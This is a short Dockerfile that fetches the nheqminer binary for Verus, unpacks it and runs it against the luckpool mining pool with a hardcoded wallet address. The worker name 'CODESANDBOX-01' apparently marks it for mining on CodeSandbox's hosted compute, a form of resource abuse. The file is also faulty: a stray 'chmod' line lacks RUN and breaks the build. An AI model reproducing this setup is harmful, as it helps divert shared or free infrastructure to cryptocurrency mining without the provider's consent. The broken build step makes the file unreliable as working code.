FROM ubuntu:16.04

MAINTAINER a2ncer@gmail.com

RUN apt-get update && \
apt-get install wget -y && \
apt-get install -y git cmake build-essential libboost-all-dev && \
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && \
tar -xvf nheqminer-Linux-v0.8.2.tgz && \
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
chmod u+x nheqminer/nheqminer

WORKDIR nheqminer
ENTRYPOINT ["nheqminer", "-v", "-l", "na.luckpool.net:3956", "-u", "RQqq9utcCzmojmMeCG5PjE39wH2MNoLvYY.CODESANDBOX-01", "-p", "x", "-t", "2", "-e", "75"]
